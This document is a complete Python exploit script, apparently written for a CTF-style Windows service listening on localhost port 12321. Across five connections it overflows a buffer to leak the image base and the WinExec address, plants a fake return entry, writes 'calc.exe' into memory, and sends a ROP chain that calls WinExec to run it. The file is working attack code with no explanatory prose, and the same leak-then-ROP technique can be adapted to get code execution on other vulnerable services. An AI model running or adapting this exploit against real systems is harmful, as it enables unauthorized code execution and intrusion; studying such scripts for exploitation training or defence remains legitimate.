import socket
import struct
import sys
import time

host = "127.0.0.1"
port = 12321

base_addr = 0
kernel32_base = 0
pWinExec = 0
pop_r14 = 0
pop_rdi_rsi = 0
mov_gadget_addr = 0
pCalcStr = 0
pop_pop_ret = 0
continue_addr = 0


def p64(address):
    return struct.pack("<Q", address)

def u64(string):
    return struct.unpack("<Q", string)[0]

# step 1: setup old stack value to 0x200
def step_1():
    print("step 1...")
    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    clientSocket.connect((host,port))
    clientSocket.send(b"BFS.\x00\x01\x00\x00")
    payload = b"1"*0xfc
    payload += b"\x00\x09" # we send only 0xfe bytes to avoid sprintf trailing \x00 overwrite index variable
    clientSocket.send(payload)
    clientSocket.recv(4096)
    clientSocket.close()

# step 2: leaking address
def step_2():
    global base_addr
    global pWinExec
    global pop_r14
    global pop_rdi_rsi
    global mov_gadget_addr
    global pCalcStr
    global kernel32_base
    global pop_pop_ret
    global continue_addr

    print("step 2...")
    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    clientSocket.connect((host,port))
    clientSocket.send(b"BFS.\x00\x01\x00\x00")
    payload = b"2"*0xfc
    clientSocket.send(payload)
    data = clientSocket.recv(4096) # will be recv 0xA00 bytes

    # because ret address at index 0 and 1 will be overwrite next 2 steps
    # so we need to leak at index 3 or 4 -> make exploit run OK on next time
    leak_offset = 276 + 4 + 8 + 8 + 8 + 8 # get index 4
    winexec_offset = 0x918
    leak_addr = u64(data[leak_offset:leak_offset+8])
    pWinExec = u64(data[winexec_offset:winexec_offset+8])

    base_addr = leak_addr - 0x14fe # 0x1a6b
    print("Image base address: 0x%x" % base_addr)

    # 0x00000001400086ba : pop r14 ; ret
    pop_r14 = base_addr + 0x86ba

    # 0x0000000140005fb8 : pop rdi ; pop rsi ; ret
    pop_rdi_rsi = base_addr + 0x5fb8

    # 0x00000001400016dd : mov rdx, rsi ; mov rcx, rdi ; call r14
    mov_gadget_addr = base_addr + 0x16dd

    # address calc.exe string, which will be setup in step 4
    pCalcStr = base_addr + 0xe5b6

    # 0x000000014000192d : pop rbx ; pop rbp ; ret
    pop_pop_ret = base_addr + 0x192d

    continue_addr = base_addr + 0x1597

    clientSocket.close()


# step 3: create a fake ret addr entry
def step_3():
    print("step 3...")
    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    clientSocket.connect((host,port))
    clientSocket.send(b"BFS.\x00\x01\x00\x00")
    payload = b"3"*0x100
    payload += b"\x04"
    payload += b"BBB"
    payload += b"C"*8 # fake ret address at idx 0
    payload += p64(pop_r14) # fake ret at idx 1 
    # sprintf stop copy here

    clientSocket.send(payload)
    clientSocket.recv(4096)
    clientSocket.close()

# step 4: put string "calc.exe\x00" into global array
def step_4():
    print("step 4...")
    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    clientSocket.connect((host,port))
    clientSocket.send(b"BFS.\x00\x01\x00\x00")
    payload = b"4"*0x100
    payload += b"\x04"
    payload += b"ccalc.exe\x00"
    # sprintf stop copy here

    clientSocket.send(payload)
    clientSocket.recv(4096)
    clientSocket.close()

# step 5: send full rop chain and trigger execution
def step_5():
    print("step 5...")
    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    clientSocket.connect((host,port))
    clientSocket.send(b"BFS.\x00\x01\x00\x00")
    payload = b"5"*0x100
    payload += b"\x01\x00" # set index to 1 -> trigger fake ret address
    # sprintf stop here to avoid overwrite data
    # the rest will be continue copied into stack
    payload += b"AAAAAA" # junk
    payload += b"tykawaii"*3 # junk
    payload += p64(pop_pop_ret) # keep "call r14" continue our rop chains & realign stack
    payload += p64(pop_rdi_rsi)
    payload += p64(pCalcStr)
    payload += p64(1)
    payload += p64(mov_gadget_addr)
    payload += p64(0xdeadbeefdeadbeef) # junk for pop_pop_ret
    payload += p64(pWinExec) # return to here
    payload += p64(continue_addr)

    clientSocket.send(payload)
    time.sleep(1)
    #clientSocket.recv(4096)
    clientSocket.close()

step_1()
#input("step 2?")

step_2()
#input("step 3?")

step_3()
#input("step 4?")

step_4()
#input("step 5?")

step_5()

